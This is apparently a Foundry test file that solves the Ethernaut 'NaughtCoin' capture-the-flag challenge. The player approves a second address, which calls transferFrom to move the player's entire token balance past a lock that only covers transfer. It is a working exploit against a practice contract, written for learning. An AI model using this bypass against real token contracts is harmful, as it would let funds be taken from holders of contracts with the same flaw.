// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin token;
    address player = address(0xBEEF);
    address receiver = address(0xCAFE);

    function setUp() public {
        token = new NaughtCoin(player);
        vm.label(player, "Player");
        vm.label(receiver, "Receiver");
        vm.deal(player, 1 ether);
    }

    function testSolveNaughtCoin() public {
        uint256 balance = token.balanceOf(player);
        console.log("Initial balance of player:", balance);

        vm.startPrank(player);
        token.approve(receiver, balance);
        vm.stopPrank();

        console.log("Player approved receiver to spend tokens");

        vm.prank(receiver);
        token.transferFrom(player, receiver, balance);
        console.log("transferFrom executed for amount:", balance);

        uint256 receiverBalance = token.balanceOf(receiver);
        uint256 playerBalance = token.balanceOf(player);

        console.log("Receiver final balance:", receiverBalance);
        console.log("Player final balance:", playerBalance);

        assertEq(receiverBalance, balance);
        assertEq(playerBalance, 0);
    }
}
